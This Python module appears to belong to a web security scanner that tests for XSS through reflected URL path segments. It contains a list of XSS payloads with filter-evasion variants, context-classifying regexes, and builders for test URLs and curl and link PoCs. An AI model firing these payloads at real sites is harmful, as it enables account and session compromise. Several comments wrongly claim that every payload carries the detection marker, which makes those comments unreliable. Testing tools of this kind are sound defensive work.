"""URL path-segment reflection XSS detection.

Some applications echo portions of the URL **path** (not query string)
into the response body without sanitization.  Because path segments
are attacker-controlled, this is a reliable XSS vector.  Common
targets:

  * ``/search/<query>``        -- SEO-friendly search pages
  * ``/user/<id>``             -- profile pages rendered with the id
  * ``/page/<slug>``           -- CMS page lookup
  * ``/api/<resource>/search`` -- REST endpoints that mirror the path
  * ``/tag/<tag>`` / ``/category/<cat>`` -- listing pages
  * ``/goto/<url>``            -- redirect / "share" endpoints
  * ``/profile/<name>/edit``   -- multi-segment slugs

A typical vulnerable snippet::

    // framework router
    app.get('/search/:q', (req, res) => {
      res.send(`<h1>Results for ${req.params.q}</h1>`);
    });

Hitting ``/search/<svg onload=alert(1)>`` yields::

    <h1>Results for <svg onload=alert(1)></h1>

Path-segment XSS has two quirks versus query-string XSS:

  1. **Path encoding is stricter.**  Browsers percent-encode ``/``,
     ``?``, ``#``, and most control characters in the path before
     sending.  To get an HTML metacharacter (``<``, ``>``, ``"``)
     through, the value MUST be percent-encoded (``%3C``, ``%3E``,
     ``%22``); the server is expected to decode it.  Raw ``<`` usually
     survives end-to-end, but ``/`` will split the segment.

  2. **Some frameworks reject unencoded slashes.**  Spring, Rails, and
     Express all have settings that 400 a request with an unencoded
     ``/`` in a path parameter.  Payloads here avoid embedded ``/``
     to stay portable.

This module:

  1. Produces path-safe payloads (no embedded ``/``).
  2. Detects whether a marker survived reflection.
  3. Classifies the surrounding context (HTML, attribute, script,
     JS string, comment).
  4. Builds a fully-formed test URL with the payload encoded into a
     path segment.
  5. Builds curl and link PoCs.
"""
from __future__ import annotations
import re
import shlex
from urllib.parse import quote, urlsplit, urlunsplit


# Path payloads.  Each contains the literal marker ``xssentinel`` so
# reflection can be detected by string search even if the surrounding
# tag is mangled.
#
# NOTE (Phase 109 correction): a few entries DO contain ``/``
# (``</script>``, ``';alert(1);//``).  The old comment claimed none did;
# the real requirement is enforced by build_test_url(), which encodes
# with safe="" so every payload -- including its slashes -- reaches the
# wire percent-encoded (%2F).  Raw ``?`` / ``#`` remain forbidden: they
# would turn the segment into a query string / fragment no matter what
# the encoder does with them.
PATH_PAYLOADS: list[str] = [
    # Plain marker -- test whether ANY of the segment lands raw.
    "xssentinel",
    # HTML-context break-outs (no embedded slash)
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Attribute-context break-outs (close the attribute, fire an event)
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    # Script / JS-string context break-outs
    '";alert(1);//',
    "';alert(1);//",
    "</script><svg onload=alert(1)>",
    # Mixed-case variants for naive lowercase filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SVG/ONLOAD=alert(1)>",
    # Template-literal sink
    "`,alert(1),`",
]


# Context-classifier regexes (mirrors header_xss.py).  The first
# matching context wins.
_CONTEXT_HTML_TAG_RE = re.compile(
    r"<\w+[^>]*\b\w+\s*=\s*[^>]*xssentinel", re.IGNORECASE,
)
_CONTEXT_ATTR_VALUE_RE = re.compile(
    r"\b\w+\s*=\s*['\"][^'\"]*xssentinel", re.IGNORECASE,
)
_CONTEXT_SCRIPT_BLOCK_RE = re.compile(
    r"<script[^>]*>[^<]*xssentinel", re.IGNORECASE | re.DOTALL,
)
_CONTEXT_JS_STRING_RE = re.compile(
    r"['\"`][^'\"`]{0,200}xssentinel[^'\"`]{0,200}['\"`]", re.DOTALL,
)
_CONTEXT_HTML_COMMENT_RE = re.compile(
    r"<!--[^>]*xssentinel", re.DOTALL,
)
_CONTEXT_TEXT_RE = re.compile(r"xssentinel")


# Default marker token.  Callers SHOULD embed this token in their
# payload so the reflection check is reliable across filter
# transformations (encoding, tag-stripping, etc.).
DEFAULT_MARKER = "xssentinel"


def path_payloads() -> list[str]:
    """Return payloads suitable for URL path-segment injection.

    All payloads are single-line and avoid embedded ``/`` so they do
    not split the path segment on frameworks that fail to decode it.
    Each payload contains the literal token ``xssentinel``.
    """
    return list(PATH_PAYLOADS)


def detect_reflection(response_text: str | None, marker: str) -> bool:
    """Return True if ``marker`` appears verbatim in ``response_text``.

    Treats ``None`` / empty inputs as no reflection.
    """
    if not response_text or not marker:
        return False
    return marker in response_text


def analyze_response(
    response_text: str | None,
    marker: str,
) -> dict:
    """Classify the reflection context of ``marker`` in the response.

    Returns::

        {
            "reflected": bool,        # marker present at all
            "context":   str,         # one of:
                                      #   "html_tag"   -- inside a tag
                                      #   "attribute"  -- inside an attr value
                                      #   "script"     -- inside <script>
                                      #   "js_string"  -- inside a JS string
                                      #   "comment"    -- inside an HTML comment
                                      #   "text"       -- raw HTML text
                                      #   "none"       -- not reflected
            "marker":    str,         # echo of the marker arg
        }
    """
    if not response_text or not marker:
        return {
            "reflected": False,
            "context": "none",
            "marker": marker or "",
        }
    reflected = marker in response_text
    if not reflected:
        ctx = "none"
    elif _CONTEXT_SCRIPT_BLOCK_RE.search(response_text):
        ctx = "script"
    elif _CONTEXT_HTML_COMMENT_RE.search(response_text):
        ctx = "comment"
    elif _CONTEXT_ATTR_VALUE_RE.search(response_text):
        ctx = "attribute"
    elif _CONTEXT_HTML_TAG_RE.search(response_text):
        ctx = "html_tag"
    elif _CONTEXT_JS_STRING_RE.search(response_text):
        ctx = "js_string"
    elif _CONTEXT_TEXT_RE.search(response_text):
        ctx = "text"
    else:
        ctx = "text"
    return {
        "reflected": reflected,
        "context": ctx,
        "marker": marker,
    }


def build_test_url(
    base_url: str,
    path_segment: str,
    payload: str,
) -> str:
    """Build a URL with ``payload`` substituted into ``path_segment``.

    ``base_url`` is the URL template that already contains the segment
    literal somewhere in its path.  The first occurrence of
    ``path_segment`` in the path is replaced by URL-encoded ``payload``.
    If the segment is not present, the encoded payload is appended to
    the path.

    The payload is encoded with ``safe=""`` so ``<``, ``>``, ``"``,
    spaces, etc. are percent-encoded -- this is what a browser would
    send.  ``/`` is also encoded (``%2F``) so the payload cannot
    accidentally split the path segment.
    """
    if not base_url:
        return ""
    parts = urlsplit(base_url)
    path = parts.path or "/"
    encoded = quote(payload or "", safe="")
    if path_segment and path_segment in path:
        path = path.replace(path_segment, encoded, 1)
    else:
        # Append the encoded payload as a new trailing segment.
        if not path.endswith("/"):
            path += "/"
        path += encoded
    return urlunsplit((
        parts.scheme,
        parts.netloc,
        path,
        parts.query,
        parts.fragment,
    ))


def build_poc_curl(url: str) -> str:
    """Build a curl command that fetches ``url`` (path payload embedded).

    The URL is shell-quoted so percent-encoded characters survive
    intact.  ``-i`` prints response headers so the auditor can verify
    the status code.
    """
    if not url:
        return ""
    return f"curl -i {shlex.quote(url)}"


def build_poc_link(url: str) -> str:
    """Build an ``<a>`` link PoC that an auditor can click.

    The URL is HTML-attribute-escaped (``&`` -> ``&amp;`` etc.) so it
    is safe to embed in an ``href`` value.
    """
    if not url:
        return ""
    safe_url = (
        url.replace("&", "&amp;")
        .replace('"', "&quot;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )
    return (
        f'<a href="{safe_url}">click to trigger path XSS PoC</a>'
    )
